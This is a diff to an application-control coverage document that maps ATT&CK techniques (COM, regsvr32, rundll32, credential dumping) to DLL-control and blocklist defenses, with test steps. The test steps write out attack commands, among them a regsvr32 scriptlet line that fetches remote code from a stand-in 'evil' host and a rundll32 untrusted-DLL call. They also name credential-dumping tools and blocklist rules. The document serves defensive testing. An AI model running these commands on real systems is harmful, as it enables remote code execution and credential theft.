@@ -412,13 +412,13 @@ IPC mechanisms (COM, DDE, pipes) between trusted processes not monitored. New fi
 **Limitations:** New DLL/exe loads from IPC are checked.
 
 ### T1559.001 - Component Object Model
-**Yes** 🟢 | DLL-control + blocklist | Testable: yes
+**Yes** 🟢 | DLL-control | Testable: yes
 
-COM server DLLs must be trusted to load. Untrusted COM DLL blocked when COM object instantiated. regsvr32 can be blocklisted to prevent COM scriptlet registration.
+COM server DLLs must be trusted to load. When a COM object is instantiated, the DLL it points to is checked by DLL control. Untrusted COM DLL blocked at load time. This is the primary defense against COM abuse for execution.
 
-**Test:** 1) Register COM object pointing to unsigned DLL -> DLL blocked when instantiated. 2) Blocklist regsvr32.exe.
+**Test:** Register COM object pointing to unsigned DLL via registry -> DLL blocked when COM object instantiated by any process.
 
-**Limitations:** COM automation between already-trusted processes not monitored - that's IPC inside trusted context.
+**Limitations:** COM automation between already-trusted processes using trusted DLLs is not monitored. Registry modification to register the COM object is not prevented.
 
 ### T1559.002 - Dynamic Data Exchange
 **Yes** 🟢 | default-deny + blocklist | Testable: yes
@@ -2443,22 +2443,22 @@ Regsvcs/Regasm. .NET registration utilities. Execute assemblies. Can be blocklis
 **Test:** 1) Blocklist regsvcs/regasm. 2) Loaded assembly must be trusted.
 
 ### T1218.010 - Regsvr32
-**Yes** 🟢 | blocklist + DLL-control | Testable: yes
+**Yes** 🟢 | DLL-control | Testable: yes
 
-Regsvr32. COM object registration. Loads DLLs. Can be blocklisted. DLLs must be trusted. Network-based scriptlet execution also blocked if regsvr32 blocklisted.
+Regsvr32 proxy execution technique. Any DLL that regsvr32 attempts to load must be trusted via DLL control. Untrusted DLLs blocked at load time regardless of how regsvr32 is invoked. Note: blanket blocklisting regsvr32.exe is impractical as it is used by Windows for legitimate COM registration. DLL control is the primary defense.
 
-**Test:** 1) Blocklist regsvr32.exe. 2) Regsvr32 loading untrusted DLL -> blocked. 3) regsvr32 /s /n /u /i:http://evil scrobj.dll -> blocked if regsvr32 blocklisted.
+**Test:** 1) regsvr32 untrusted.dll -> DLL blocked at load. 2) regsvr32 /s /n /u /i:http://evil/script scrobj.dll -> if scrobj.dll payload writes untrusted DLL, blocked. DLL control catches the payload regardless.
 
-**Limitations:** Key LOLBIN.
+**Limitations:** regsvr32 itself cannot be practically blocklisted without breaking Windows. The defense is DLL control on what regsvr32 loads, not blocking regsvr32.
 
 ### T1218.011 - Rundll32
-**Yes** 🟢 | DLL-control + blocklist | Testable: yes
+**Yes** 🟢 | DLL-control | Testable: yes
 
-Rundll32. Executes DLL exports. DLL must be trusted. Rundll32 can be blocklisted for non-admins.
+Rundll32 executes DLL exports. Any DLL passed to rundll32 must be trusted via DLL control. Untrusted DLLs blocked at load time. Note: blanket blocklisting rundll32.exe is impractical as it is used by Windows for Control Panel, shell extensions, and system operations. Restricting rundll32 for non-admins via metarule is possible but aggressive - evaluate operational impact. DLL control is the primary defense.
 
-**Test:** 1) rundll32 untrusted.dll,EntryPoint -> DLL blocked. 2) Blocklist rundll32 for non-admins.
+**Test:** rundll32 C:\Temp\untrusted.dll,EntryPoint -> DLL blocked at load. DLL control catches the payload regardless of how rundll32 is invoked.
 
-**Limitations:** Rundll32 with trusted DLLs runs normally.
+**Limitations:** rundll32 with trusted DLLs runs normally. Blocklisting rundll32 for non-admins is possible via metarule but may break legitimate functionality. Test thoroughly in audit mode.
 
 ### T1218.012 - Verclsid
 **Yes** 🟢 | DLL-control | Testable: yes
@@ -3052,18 +3052,18 @@ Selective exclusion. Malware selectively targeting systems. Behavioral.
 ### T1003 - OS Credential Dumping
 **Yes** 🟢 | default-deny + blocklist-metarule + predefined-blocklist | Testable: yes
 
-Untrusted dumping tools (mimikatz, secretsdump) blocked by default-deny. Built-in tools usable for credential dumping (procdump, comsvcs.dll via rundll32, reg.exe for SAM export) can be restricted via blocklist metarules: blocklist procdump by original_filename, restrict rundll32 for non-admins, restrict reg.exe for non-admins. Predefined Microsoft Recommended Block Rules covers many credential tools.
+Untrusted dumping tools (mimikatz, secretsdump) blocked by default-deny. Built-in tools usable for credential dumping (procdump, reg.exe for SAM export) can be restricted via blocklist metarules. comsvcs.dll MiniDump via rundll32: DLL control ensures comsvcs.dll must be trusted, but it ships with Windows and is trusted. Restricting rundll32 for non-admins via metarule is possible but aggressive. Predefined Microsoft Recommended Block Rules covers many credential tools.
 
-**Test:** 1) mimikatz.exe -> blocked (untrusted). 2) Blocklist procdump.exe by original_filename. 3) Blocklist metarule: original_filename 'rundll32' AND user NOT admin -> blocks comsvcs.dll MiniDump for non-admins. 4) Import Microsoft Recommended Block Rules.
+**Test:** 1) mimikatz.exe -> blocked (untrusted). 2) Blocklist procdump.exe by original_filename. 3) reg.exe restrictable for non-admins via metarule. 4) Import Microsoft Recommended Block Rules. 5) Credential Guard recommended for LSASS protection.
 
 **Limitations:** Admin users exempted from metarule can still use these tools. Credential Guard is complementary control for LSASS protection.
 
 ### T1003.001 - LSASS Memory
 **Yes** 🟢 | default-deny + blocklist-metarule | Testable: yes
 
-LSASS memory dump tools blocked (mimikatz untrusted, procdump blocklisted). comsvcs.dll MiniDump via rundll32: restrict rundll32 for non-admins via metarule. Task Manager dump requires interactive admin session - outside typical attacker workflow.
+LSASS memory dump tools blocked (mimikatz untrusted, procdump blocklistable). comsvcs.dll MiniDump via rundll32: both are trusted Windows components. Restricting rundll32 for non-admins via metarule is possible but aggressive and may break legitimate functionality. Task Manager dump requires interactive admin session. Credential Guard is the definitive LSASS protection control.
 
-**Test:** 1) mimikatz -> blocked. 2) Blocklist procdump by original_filename. 3) Metarule: original_filename 'rundll32' AND user NOT admin -> blocks comsvcs.dll abuse. 4) Credential Guard for defense-in-depth.
+**Test:** 1) mimikatz -> blocked. 2) Blocklist procdump by original_filename. 3) Credential Guard for defense-in-depth. 4) Rundll32 restriction for non-admins: test in audit mode first.
 
 **Limitations:** Admin-exempted users can still dump. Credential Guard is the definitive LSASS control.
 
